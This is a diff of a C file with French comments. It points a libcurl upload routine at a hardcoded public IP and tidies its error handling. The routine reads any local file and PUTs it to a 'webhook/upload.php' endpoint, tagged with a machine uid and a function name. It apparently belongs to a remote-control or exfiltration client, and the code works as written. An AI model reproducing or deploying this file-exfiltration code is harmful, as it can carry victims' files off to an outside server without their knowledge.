@@ -5,7 +5,7 @@
 #include <fcntl.h>
 #include "../include/uid.h"
 
-const char SERVER_URL[]  = "http://localhost/src/";
+const char SERVER_URL[]  = "http://195.15.243.173/";
 
 size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
 
@@ -55,8 +55,7 @@ void send_to_server(char* route, char* data){
     }
 };
 
-int upload_to_server(char * file_path, char* func_name, char* param){
-
+int upload_to_server(char *file_path, char *func_name, char *param) {
     /* Lire et Upload un fichier via son path sur le serveur via 
     requette  PUT sur /upload.php*/
 
@@ -69,32 +68,45 @@ int upload_to_server(char * file_path, char* func_name, char* param){
     get_uid(uid);
 
     char final_url[256];
-    snprintf(final_url, 256, "%s%s?uid=%s&func_name=%s&params=%s", SERVER_URL, "upload.php", uid, func_name, param);
+    snprintf(final_url, sizeof(final_url), "%s%s?uid=%s&func_name=%s&params=%s", SERVER_URL, "webhook/upload.php", uid, func_name, param);
 
-    //lire le fichier
+    // lire le fichier
     FILE *fd;
     fd = fopen(file_path, "rb");
-    if(!fd)
+    if (!fd) {
+        fprintf(stderr, "Erreur: impossible d'ouvrir le fichier %s\n", file_path);
         return -1;
-        
-    if(fstat(fileno(fd), &file_info) != 0)
-        return -1; 
-        
+    }
+
+    if (fstat(fileno(fd), &file_info) != 0) {
+        fprintf(stderr, "Erreur: impossible d'obtenir les informations du fichier %s\n", file_path);
+        fclose(fd);
+        return -1;
+    }
+
     curl = curl_easy_init();
-    if(curl) {
+    if (curl) {
         printf("[*] Requette sur /upload.php\n");
         curl_easy_setopt(curl, CURLOPT_URL, final_url);
         curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
         curl_easy_setopt(curl, CURLOPT_READDATA, fd);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,(curl_off_t)file_info.st_size);
+        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
         res = curl_easy_perform(curl);
         curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status_code);
-        if(status_code == 200){
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Erreur: curl_easy_perform() a échoué: %s\n", curl_easy_strerror(res));
+        }
+        if (status_code == 200) {
             printf("[+] La requette a bien ete envoyee\n");
-        }else{
+        } else {
             printf("[-] Erreur sur l'envoie de la requette, status code != 200 ou le serveur est indisponible\n");
-        };
+        }
         curl_easy_cleanup(curl);
+    } else {
+        fprintf(stderr, "Erreur: impossible d'initialiser CURL\n");
     }
-};
+
+    fclose(fd);
+    return (status_code == 200) ? 0 : -1;
+}
